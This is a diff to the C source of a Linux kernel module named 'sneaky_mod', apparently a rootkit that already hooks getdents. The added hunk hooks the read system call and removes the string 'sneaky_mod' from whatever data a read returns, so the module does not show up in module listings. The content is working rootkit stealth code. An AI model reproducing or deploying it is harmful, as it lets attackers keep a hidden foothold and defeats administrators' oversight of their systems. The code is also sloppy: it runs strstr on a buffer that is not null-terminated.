@@ -121,6 +121,31 @@ asmlinkage int sneaky_getdents (unsigned int fd,
 }
 
 
+////////////////////////////////
+///  "read" system call
+////////////////////////////////
+asmlinkage ssize_t (*sys_read) (int fd, void *buf, size_t count);
+
+ssize_t sneaky_read(int fd, void *buf, size_t count) {
+  ssize_t read_size;
+
+  // read using the system call
+  read_size = sys_read(fd, buf, count);
+
+  // try to locate "sneaky_mod" in the read result
+  if (read_size >= 1) {
+    char* ptr;
+    ptr = strstr(buf, "sneaky_mod");
+
+    if (ptr != NULL) { // if found: skip it
+      int size_after_it;
+      size_after_it = read_size - 10 - (int)((void*)ptr - buf);
+      memmove(ptr, ptr + 10, size_after_it);
+      read_size -= 10;
+    }
+  }
+  return read_size;
+}
 
 ////////////////////////////////
 ///  module load/unload routine
